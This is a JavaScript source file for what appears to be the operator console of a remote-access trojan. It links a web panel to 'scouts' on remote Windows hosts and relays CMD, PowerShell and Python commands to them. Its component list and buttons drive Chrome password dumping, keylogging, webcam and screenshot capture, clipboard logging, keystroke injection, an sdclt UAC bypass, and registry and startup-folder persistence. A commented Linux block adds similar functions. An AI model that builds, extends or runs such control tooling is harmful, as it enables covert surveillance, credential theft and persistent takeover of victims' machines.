DirectGlobals = {
    "bridged_to": undefined,
    "scout_os": undefined,
    "windows_file_to_component": [
        {"windows/control/active_windows_dump": "activeWindowsDump"},
        {"windows/control/check_admin": "checkAdmin"},
        {"windows/control/chrome_password_dump": "chromePasswordDump"},
        {"windows/control/clip_logger": "clipLogger"},
        {"windows/control/download_file": "downloadFile"},
        {"windows/control/download_web": "downloadWeb"},
        {"windows/control/get_idle": "getIdle"},
        {"windows/control/in_memory_screenshot": "screenshot"},
        {"windows/control/in_memory_webcam": "webcam"},
        {"windows/control/key_and_window_logger": "logger"},
        {"windows/control/system_info_grabber": "systemInfo"},
        {"windows/control/browser": "browser"},
        {"windows/control/inject_keystrokes": "injectKeystrokes"},
        {"windows/control/interface_lock": "interfaceLock"},
        {"windows/control/volume_control": "setAudio"},
        {"windows/control/system_status_change": "systemStatusChange"},
        {"windows/control/upload_file": "uploadFile"},
        {"windows/control/wallpaper_changer": "wallpaperChanger"},
        {"windows/control/execute_command_cmd": "CMD"},
        {"windows/control/execute_command_powershell": "powershell"},
        {"windows/control/execute_file": "file"},
        {"windows/control/execute_python": "python"},
        {"windows/control/registry_persistence": "registryPersistence"},
        {"windows/control/sdclt_uac_bypass": "sdcltUACBypass"},
        {"windows/control/startup_folder_persistence": "startupFolderPersistence"}
    ]
};
$(document).ready(function () {
    function onStart() {
        triggerAjax(`get_bridged()`, true, "/direct_process", getBridgedCB, undefined)
    }
    onStart();

    $(document).on("click", ".button_win_classify", function() {
        if ($(this).attr("data-type") == "navigate_category") {
            displayCategory($(this).attr("data-categoryToDisplay"))
        } else if ($(this).attr("data-type") == "navigate_component") {
            displayComponent($(this).attr("data-component"))
        } else if ($(this).attr("data-type") == "trigger") {
            if ($(this).attr("id") != "button_win_classify_base_sleep") {
                $("#div_win_classify_base_sleep").hide()
            }
            trigger(this, true)
        } else if ($(this).attr("data-type") == "show") {
            $($(this).attr("data-toShow")).show()
        }
    });
    $(document).on("click", ".button_win_components", function () {
        if ($(this).attr("data-type") == "trigger") {
            trigger(this, true)
        }
    })
    $(document).on("click", "#button_win_components_back", function () {
        $("#div_win_components").hide()
        $("#div_win_classify").show()
    })
    $(document).on('keypress, keydown', '[data-input-onCtrlC="trigger"]', function(event) {
        if ((event.ctrlKey || event.metaKey) && event.keyCode === 67) {
            let success_trigger = trigger(this, true)
            if ($(this).attr("data-multiline-class") == "console_exec_py_script") {
                $(`[data-multiline-class="console_exec_py_script"]`).attr("data-multiline-class", "invalid_console_exec_py_script").prop("readonly", true)
            }
            if (!success_trigger) {
                logToConsole("", "input")
            }
        }
    });
    $(document).on('keypress, keydown', '[data-input-onEnter="trigger"]', function(event) {
        if (event.which === 13) {
            if ($(this).attr("class") == "input_console_command") {
                if ($(this).val().trim() == "exec_py_script") {
                    $(this).removeAttr("data-input-onEnter")
                    $(".input_console_command").attr("readonly", true);
                    $("#div_console_output").append(`<div><input type="text" value=">>> " style="width: 100% !important; height: 25px !important; background-color: #252629 !important; border-radius: 0 !important; margin: 0 !important;" autocomplete="off" data-input-type="multiline_input" data-index=0 data-multiline-class="console_exec_py_script" data-input-prompt=">>> " data-input-onCtrlC="trigger" data-input-command="exec_py <[data-multiline-class='console_exec_py_script']>"></div>`)
                    $(`[data-multiline-class="console_exec_py_script"][data-index="0"]`).focus()
                    $(`[data-multiline-class="console_exec_py_script"][data-index="0"]`)[0].selectionStart = $(`[data-multiline-class="console_exec_py_script"][data-index="0"]`).attr("data-input-prompt").length
                    $(`[data-multiline-class="console_exec_py_script"][data-index="0"]`)[0].selectionEnd = $(`[data-multiline-class="console_exec_py_script"][data-index="0"]`).attr("data-input-prompt").length
                    return
                }
            }
            trigger(this, $(this).attr("class") != "input_console_command")
        }
    });

    $(document).on('keypress, keydown', '[data-input-type="singleline_shell"]', function(event) {
        let promptLength = parseInt($(this).attr("data-input-promptLength"), 10)
        if (this.selectionStart < promptLength) {
            document.getElementById($(this).attr('id')).selectionStart = $(this).val().length;
            document.getElementById($(this).attr('id')).selectionEnd = $(this).val().length;
        }
        if (event.which === 37) {
            if (this.selectionStart === promptLength) {
                return false;
            }
        } else if (event.which === 8) {
            if (this.selectionStart !== this.selectionEnd) {
                return this.selectionStart >= promptLength - 1;
            } else {
                if (this.selectionStart === promptLength) {
                    return false;
                }
            }
        } else if (event.which === 13 || event.which === 40 || event.which === 38) {
            return false;
        } else {
            return this.selectionStart >= promptLength;
        }
    });
    $(document).on('mousedown, mouseup', '[data-input-type="singleline_shell"]', function() {
        let promptLength = parseInt($(this).attr("data-input-promptLength"), 10)
        if (this.selectionStart < promptLength) {
            document.getElementById($(this).attr('id')).selectionStart = promptLength;
            document.getElementById($(this).attr('id')).selectionEnd = promptLength;
        }
    });
    $(document).on('keypress, keydown', '[data-input-type="multiline_input"]', function(event) {
        let index = parseInt(getIndexOfElement($(this)), 10)
        let prompt = $(this).attr("data-input-prompt")
        let promptLength = prompt.length
        let multiline_class = $(this).attr("data-multiline-class")
        if (this.selectionStart < promptLength) {
            $(this)[0].selectionStart = $(this).val().length;
            $(this)[0].selectionEnd = $(this).val().length;
        }
        if (event.which === 37) {
            if (this.selectionStart === promptLength) {
                return false;
            }
        } else if (event.which === 8) {
            if (this.selectionStart !== this.selectionEnd) {
                return this.selectionStart >= promptLength - 1;
            } else {
                if (this.selectionStart === promptLength) {
                    if (index != 0) {
                        let $element;
                        $element = $(`[data-multiline-class="${multiline_class}"][data-index="${index-1}"]`)
                        let valueOfDeletable = $(this).val().slice(promptLength);
                        let pointerLocationToSet = $element.val().length;
                        deleteInputRow(multiline_class, index);
                        $element.val($element.val() + valueOfDeletable);
                        $element.focus();
                        $element[0].selectionStart = pointerLocationToSet;
                        $element[0].selectionEnd = pointerLocationToSet;
                        return false;
                    } else {
                        return false;
                    }
                }
            }
        } else if (event.which === 13) {
            let valueOfEnterable = $(this).val().slice(this.selectionStart);
            $(this).val($(this).val().slice(0, this.selectionStart));
            insertInputRow(multiline_class, index, prompt, $(this).attr("data-input-command"), $(this).attr("data-input-onCtrlC"));
            let $element = $(`[data-multiline-class="${multiline_class}"][data-index="${index+1}"]`)
            $element.val(prompt + valueOfEnterable);
            $element.focus();
            $element.get(0).selectionStart = promptLength;
            $element.get(0).selectionEnd = promptLength;
            return false;
        } else if (event.which === 40) {
            if (parseInt(index, 10) < $(`[data-multiline-class="${multiline_class}"]`).length - 1) {
                let pos = this.selectionStart;
                let $element = $(`[data-multiline-class="${multiline_class}"][data-index="${index+1}"]`)
                $element.focus();
                $element[0].selectionStart = pos;
                $element[0].selectionEnd = pos;
            }
            return false;
        } else if (event.which === 38) {
            if (parseInt(index, 10) > 0) {
                let pos = this.selectionStart;
                let $element;
                $element = $(`[data-multiline-class="${multiline_class}"][data-index="${index-1}"]`)
                $element.focus();
                $element[0].selectionStart = pos;
                $element[0].selectionEnd = pos;
            }
            return false;
        } else {
            return this.selectionStart >= promptLength;
        }
    });
    $(document).on('mousedown, mouseup', '[data-input-type="multiline_input"]', function() {
        let promptLength = parseInt($(this).attr("data-input-promptLength"), 10)
        if (this.selectionStart < promptLength) {
            $(this)[0].selectionStart = promptLength;
            $(this)[0].selectionEnd = promptLength;
        }
    });

    function deleteInputRow(multiline_class, index) {
        $(`[data-multiline-class="${multiline_class}"][data-index="${index}"]`).remove();
        for (let i = index + 1; i <= $(`[data-multiline-class="${multiline_class}"]`).length; i++) {
            $(`[data-multiline-class="${multiline_class}"][data-index="${i}"]`).attr("data-index", i-1)
        }
    }
    function insertInputRow(multiline_class, index, prompt, command, onCtrlC) {
        for (let i = $(`[data-multiline-class="${multiline_class}"]`).length; i > index; i--) {
            $(`[data-multiline-class="${multiline_class}"][data-index="${i}"]`).attr("data-index", i+1)
        }
        $(`[data-multiline-class="${multiline_class}"][data-index="0"]`).parent().insertAt(index + 1, `<input type="text" value="${prompt}" style="width: 100% !important; height: 25px !important; background-color: #252629 !important; border-radius: 0 !important; margin: 0 !important;" autocomplete="off" data-input-type="multiline_input" data-index=${index+1} data-multiline-class="${multiline_class}" data-input-prompt="${prompt}" data-input-onCtrlC="${onCtrlC}" data-input-command="${command}">`);
    }
    jQuery.fn.insertAt = function(index, element) {
        let lastIndex = this.children().length;
        if (index < 0) {
            index = Math.max(0, lastIndex + 1 + index);
        }
        this.append(element);
        if (index < lastIndex) {
            this.children().eq(index).before(this.children().last());
        }
        return this;
    };

    function getBridgedCB(recvData) {
        let status = recvData["status"];
        let message = recvData["message"];
        let data = recvData["data"];
        if (status == "ok") {
            $("#h1_direct_heading").html(`${data["scout_info"][Object.keys(data["scout_info"])[0]]["host"]} >> ${data["scout_info"][Object.keys(data["scout_info"])[0]]["port"]}`)
            DirectGlobals['bridged_to'] = Object.keys(data["scout_info"])[0]
            $(".div_win_components").hide()
            $(".div_win_classify").hide()
            $("#button_win_components_back").hide()
            $(".i_win_classify").hide()
            logToConsole("[*]Loading available functions...");
            triggerAjax(`send("loaded_components")`, true, "/direct_process", loadedComponentsCB, undefined)
        } else {
            show_message(message, true)
        }
    }
    function loadedComponentsCB(recvData) {
        let data = recvData["data"]
        if (data["switch_interface"]) {
            window.location.href = document.location.origin + "/scouts"
            return;
        }
        console.log(data["scout_output"])
        logToConsole("[+]Available functions loaded");
        logToConsole("", "input")
        highlightAvailableFunctions(data["scout_output"])
        displayCategory("base")
        removeLoader();
    }
    function sendCB(recvData) {
        let data = recvData["data"]
        if (data["switch_interface"]) {
            window.location.href = document.location.origin + "/scouts"
            return;
        }
        logToConsole(data["scout_output"])
        logToConsole("", "input");
    }

    function send(command, log_command) {
        if (log_command) {
            if ($(".input_console_command").last().val() !== "") {
                logToConsole("", "input")
            }
        }
        $(".input_console_command").last().val(command);
        command = command.toString()
            .replace(/\\/g, '\\\\')
            .replace(/"/g, '\\"')
            .replace(/\n/g, '\\n')

        triggerAjax(`send("${command}")`, true, "/direct_process", sendCB, undefined)
    }
    function logToConsole(text="", type="text", newline=true) {
        let $selector = $("#div_console_output");
        if (type == "text") {
            $selector.append(String.raw`${text.toString()
                .replace(/ /g, "\u00A0")
                .replace(/\u00A0</g, "\u00A0&lt;")
                .replace(/\u00A0>/g, "\u00A0&gt;")
                .replace(/<\u00A0/g, "&lt;\u00A0")
                .replace(/>\u00A0/g, "&gt;\u00A0")
                .replace(/-/g, "&#8209;")
                .replace(/\[\+\]/g, "<p1 style='color: #13a10e'>[+]</p1>")
                .replace(/\[\*\]/g, "<p1 style='color: #3b78ff'>[*]</p1>")
                .replace(/\[\&#8209;\]/g, "<p1 style='color: #e74856'>[-]</p1>")
                .replace(/\[\!\]/g, "<p1 style='color: #f9f1a5'>[!]</p1>")
                .replace(/\[\>\]/g, "<p1 style='color: #b4009e'>[>]</p1>")}`.replace(/\n/g, "<br>"));
            if (newline) {
                $selector.append("<br>");
            }
        } else if (type == "input") {
            let index = $(".input_console_command").length;
            $(".input_console_command").attr("readonly", true);
            logToConsole("[>]", "text", false);
            $selector.append(`<input type="text" style="height: auto !important; background-color: #252629 !important; font-size: inherit !important; color: #bfbfbb !important;" class="input_console_command" autocomplete='off' data-index=${index} data-input-allowEmpty="false" data-input-strip="false" data-input-type="text" data-input-onEnter="trigger" data-input-command="<.input_console_command:last-of-type>"><br>`);
            getElementByIndex("input_console_command", index).focus();
        }
    }
    function highlightAvailableFunctions(l) {
        let c = "#e74856";
        if (l["windows"]) {
            DirectGlobals["scout_os"] = "win";
            for (const [file, component] of Object.entries(DirectGlobals["windows_file_to_component"])) {
                if (jQuery.inArray(file, l["components"]) > -1) {
                    $(`.button_win_classify[data-component="${component}"]`).prop('disabled', false).css("background-color", "#2f3136");
                } else {
                    $(`.button_win_classify[data-component="${component}"]`).prop('disabled', true).attr("style", `background-color: ${c} !important; width: 23% !important;`)
                }
            }
        }
        // else if (jQuery.inArray("linux/bases/bind_tcp_base", l) > -1 || jQuery.inArray("linux/bases/reverse_tcp_base", l) > -1) {
        //     ScoutGlobals.scoutOS = "lin";
        //     if (jQuery.inArray("linux/control/active_windows_dump", l) > -1) {
        //         $("#button_direct_classify_lin_read_activeWindowsDump").prop('disabled', false).css("background-color", "#2f3136");
        //     } else {
        //         $("#button_direct_classify_lin_read_activeWindowsDump").prop('disabled', true).attr("style", "background-color: " + c + " !important; width: 31.3% !important;")
        //     }
        //
        //     if (jQuery.inArray("linux/control/check_admin", l) > -1) {
        //         $("#button_direct_classify_lin_read_checkAdmin").prop('disabled', false).css("background-color", "#2f3136");
        //     } else {
        //         $("#button_direct_classify_lin_read_checkAdmin").prop('disabled', true).attr("style", "background-color: " + c + " !important; width: 31.3% !important;")
        //     }
        //
        //     if (jQuery.inArray("linux/control/clip_logger", l) > -1) {
        //         $("#button_direct_classify_lin_read_clipLogger").prop('disabled', false).css("background-color", "#2f3136");
        //     } else {
        //         $("#button_direct_classify_lin_read_clipLogger").prop('disabled', true).attr("style", "background-color: " + c + " !important; width: 31.3% !important;")
        //     }
        //
        //     if (jQuery.inArray("linux/control/download_file", l) > -1) {
        //         $("#button_direct_classify_lin_read_downloadFile").prop('disabled', false).css("background-color", "#2f3136");
        //     } else {
        //         $("#button_direct_classify_lin_read_downloadFile").prop('disabled', true).attr("style", "background-color: " + c + " !important; width: 31.3% !important;")
        //     }
        //
        //     if (jQuery.inArray("linux/control/download_web", l) > -1) {
        //         $("#button_direct_classify_lin_read_downloadWeb").prop('disabled', false).css("background-color", "#2f3136");
        //     } else {
        //         $("#button_direct_classify_lin_read_downloadWeb").prop('disabled', true).attr("style", "background-color: " + c + " !important; width: 31.3% !important;")
        //     }
        //
        //     if (jQuery.inArray("linux/control/in_memory_screenshot", l) > -1) {
        //         $("#button_direct_classify_lin_read_screenshot").prop('disabled', false).css("background-color", "#2f3136");
        //     } else {
        //         $("#button_direct_classify_lin_read_screenshot").prop('disabled', true).attr("style", "background-color: " + c + " !important; width: 31.3% !important;")
        //     }
        //
        //     if (jQuery.inArray("linux/control/in_memory_webcam", l) > -1) {
        //         $("#button_direct_classify_lin_read_webcam").prop('disabled', false).css("background-color", "#2f3136");
        //     } else {
        //         $("#button_direct_classify_lin_read_webcam").prop('disabled', true).attr("style", "background-color: " + c + " !important; width: 31.3% !important;")
        //     }
        //
        //     if (jQuery.inArray("linux/control/key_and_window_logger", l) > -1) {
        //         $("#button_direct_classify_lin_read_logger").prop('disabled', false).css("background-color", "#2f3136");
        //     } else {
        //         $("#button_direct_classify_lin_read_logger").prop('disabled', true).attr("style", "background-color: " + c + " !important; width: 31.3% !important;")
        //     }
        //
        //     if (jQuery.inArray("linux/control/system_info_grabber", l) > -1) {
        //         $("#button_direct_classify_lin_read_systemInfo").prop('disabled', false).css("background-color", "#2f3136");
        //     } else {
        //         $("#button_direct_classify_lin_read_systemInfo").prop('disabled', true).attr("style", "background-color: " + c + " !important; width: 31.3% !important;")
        //     }
        //
        //     if (jQuery.inArray("linux/control/inject_keystrokes", l) > -1) {
        //         $("#button_direct_classify_lin_write_injectKeystrokes").prop('disabled', false).css("background-color", "#2f3136");
        //     } else {
        //         $("#button_direct_classify_lin_write_injectKeystrokes").prop('disabled', true).attr("style", "background-color: " + c + " !important; width: 23% !important;")
        //     }
        //
        //     if (jQuery.inArray("linux/control/set_audio", l) > -1) {
        //         $("#button_direct_classify_lin_write_setAudio").prop('disabled', false).css("background-color", "#2f3136");
        //     } else {
        //         $("#button_direct_classify_lin_write_setAudio").prop('disabled', true).attr("style", "background-color: " + c + " !important; width: 23% !important;")
        //     }
        //
        //     if (jQuery.inArray("linux/control/upload_file", l) > -1) {
        //         $("#button_direct_classify_lin_write_uploadFile").prop('disabled', false).css("background-color", "#2f3136");
        //     } else {
        //         $("#button_direct_classify_lin_write_uploadFile").prop('disabled', true).attr("style", "background-color: " + c + " !important; width: 31.3% !important;")
        //     }
        //
        //     if (jQuery.inArray("linux/control/execute_command_bash", l) > -1) {
        //         $("#button_direct_classify_lin_execute_bash").prop('disabled', false).css("background-color", "#2f3136");
        //     } else {
        //         $("#button_direct_classify_lin_execute_bash").prop('disabled', true).attr("style", "background-color: " + c + " !important; width: 48% !important;")
        //     }
        //
        //     if (jQuery.inArray("linux/control/execute_python", l) > -1) {
        //         $("#button_direct_classify_lin_execute_python").prop('disabled', false).css("background-color", "#2f3136");
        //     } else {
        //         $("#button_direct_classify_lin_execute_python").prop('disabled', true).attr("style", "background-color: " + c + " !important; width: 48% !important;")
        //     }
        //
        //     if (jQuery.inArray("linux/control/cron_job_persistence", l) > -1) {
        //         $("#button_direct_classify_lin_persist_cronJobPersistence").prop('disabled', false).css("background-color", "#2f3136");
        //     } else {
        //         $("#button_direct_classify_lin_persist_cronJobPersistence").prop('disabled', true).attr("style", "background-color: " + c + " !important; width: 55% !important;")
        //     }
        // }
    }
    function displayCategory(category) {
        if (DirectGlobals["scout_os"] == "win") {
            $("#div_win_components").hide()
            $("#div_win_classify").show()
            $(`.div_win_classify`).hide()
            $(`.div_win_classify[data-category="${category}"]`).show()
            $(`.br_win_classify`).hide()
            $(`.br_win_classify[data-category="${category}"]`).show()
            $(`.button_win_classify[data-type="navigate_category"]`).css("background-color", "#2f3136");
            $(`.button_win_classify[data-categoryToDisplay="${category}"]`).css("background-color", "#42444a");
        } else if (DirectGlobals["scout_os"] == "lin") {

        }
    }
    function displayComponent(component) {
        $("#div_win_classify").hide()
        $("#div_win_components").show()
        $(`.div_win_components`).hide()
        $(`.div_win_components[data-component="${component}"]`).show()
        $("#button_win_components_back").show()
    }
    function boolGen(string) {
        console.log(string)
        if (string == "true") {return true;} else if (string == "false") {return false;}
    }
    function parseInput(identifier) {
        let type = $(identifier).attr("data-input-type")
        if (type == "text") {
            let val = $(identifier).val()
            let strip = boolGen($(identifier).attr("data-input-strip"))
            if (strip) {
                val = val.trim()
            }
            if (boolGen($(identifier).attr("data-input-allowEmpty")) || val != "") {
                return val
            }
            return false
        } else if (type == "number") {
            let val = parseInt($(identifier).val(), 10)
            if (boolGen($(identifier).attr("data-input-allowEmpty")) || !isNaN(val)) {
                if (isNaN(val)) {val = ""}
                return val
            }
            return false
        } else if (type == "singleline_shell") {
            let val = $(identifier).val().slice($(identifier).attr("data-input-prompt").length)
            if (boolGen($(identifier).attr("data-input-allowEmpty")) || val != "") {
                return val
            }
            return false;
        } else if (type == "multiline_input") {
            let command = "";
            $(`[data-multiline-class="${$(identifier).attr("data-multiline-class")}"]`).each(function () {
                command = command + $(this).val().slice($(this).attr("data-input-prompt").length) + "\n";
            });
            if (command != "") {
                return command
            }
            return false;
        }
    }
    function clearInput(identifier) {
        let type = $(identifier).attr("data-input-type")
        if (type == "text" || (type == "number")) {
            $(identifier).val("")
        } else if (type == "singleline_shell") {
            $(identifier).val($(identifier).attr("data-input-prompt"))
        }
    }
    function trigger($this, log_command) {
        let command;
        command = $($this).attr("data-command")
        if (command == undefined) {
            command = $($this).attr("data-input-command")
        }
        if (command == undefined) {
            logToConsole("[-] Trigger element triggered with no command")
            return
        }
        let match_list = command.match(/<(.*?)>/gi);
        if (match_list == null) {
            match_list = [];
        }
        let identifier_list = match_list.map(match => match.replace(/<(.*?)>/gi, "$1"))
        let input_values = []
        let clear_after_send_list = []
        for (let identifier of identifier_list) {
            let val = parseInput(identifier)
            if (val == false) {
                return false;
            }
            let clear_after_send = boolGen($(identifier).attr("data-input-clearAfterSend"))
            console.log(clear_after_send)
            if (clear_after_send == undefined) {
                clear_after_send = false
            }
            clear_after_send_list.push(clear_after_send)
            input_values.push(parseInput(identifier))
        }
        for (let i = 0; i < input_values.length; i++) {
            command = command.replace(/<(.*?)>/, input_values[i])
        }
        if ($($this).hasClass("input_console_command")) {
            $(this).removeAttr("data-input-onEnter")
        }
        send(command, log_command)
        console.log(clear_after_send_list)
        for (let i = 0; i < clear_after_send_list.length; i++) {
            if (clear_after_send_list[i]) {
                clearInput(identifier_list[i])
            }
        }
        return true;
    }
});